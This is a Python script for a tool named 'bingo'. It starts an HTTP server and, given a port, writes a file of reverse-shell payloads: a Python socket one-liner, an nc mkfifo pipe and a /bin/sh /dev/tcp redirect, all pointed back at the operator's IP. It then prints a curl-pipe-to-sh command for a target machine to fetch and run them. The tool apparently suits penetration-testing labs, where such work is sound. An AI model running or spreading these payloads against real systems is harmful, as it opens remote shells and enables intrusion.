#! /usr/bin/python3

import http.server
import socketserver
import os
import argparse
import netifaces as ni
import pyfiglet
from random import randint
from termcolor import colored
import sys

def makebanner():
	colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
	fonts=["smslant", "crawford","cursive","pyramid","stacey","slant","5lineoblique","ticks","contessa","hex","pawp","block","graffiti","linux","charact3","bulbhead"]
	colorsint = randint(0, 5)
	fontsint = randint(0, 15)
	font = fonts[fontsint]
	banner = pyfiglet.figlet_format("bingo", font = font)
	print(colored(banner, colors[colorsint]))

makebanner()

parser = argparse.ArgumentParser(description = 'Tool to start a python http server in a simple way, with support a reverse shell.')
parser.add_argument('-p', action = 'store', dest = 'port', default = 8000, required = False, type = int, help = 'Port to open http server.')
parser.add_argument('-rs', action = 'store', dest = 'reverse_shell_port', required = False, help = 'To open a reverse shell code. (specify port)')
arguments = parser.parse_args()

port = arguments.port

interfaces = ni.interfaces()
if "tun0" in interfaces:
    interface = "tun0" 
elif "eth0" in interfaces:
	interface = "eth0"
elif "wlan0" in interfaces:
	interface = "wlan0"

def main():
	global arguments
	ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
	if arguments.reverse_shell_port:
		revfile = """

		if command -v python > /dev/null 2>&1; then
			python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{0}",{1})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
			exit;
		fi

		if command -v nc > /dev/null 2>&1; then
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f
			exit;
		fi

		if command -v sh > /dev/null 2>&1; then
			/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1
			exit;
		fi """.format(ip, arguments.reverse_shell_port)
		
		if os.path.exists("bingors"):
			os.remove("bingors")
		
		revfileh = open("bingors", "w")
		revfileh.write(revfile)
		revfileh.close()

	handler = http.server.SimpleHTTPRequestHandler
	with socketserver.TCPServer(("", port), handler) as httpd:
	    print("HTTP server opened on port", port)
	    print("Url:","http://"+str(ip)+":"+str(port))
	    if arguments.reverse_shell_port:
		    message = "CMD: curl http://"+str(ip)+":"+str(port)+"/bingors"+"|"+"sh"
		    print(message)
	    httpd.serve_forever()
try:
	main()
except KeyboardInterrupt:
	print(colored("\nExit", "red"))
	if os.path.exists("bingors"):
			os.remove("bingors")
	exit()
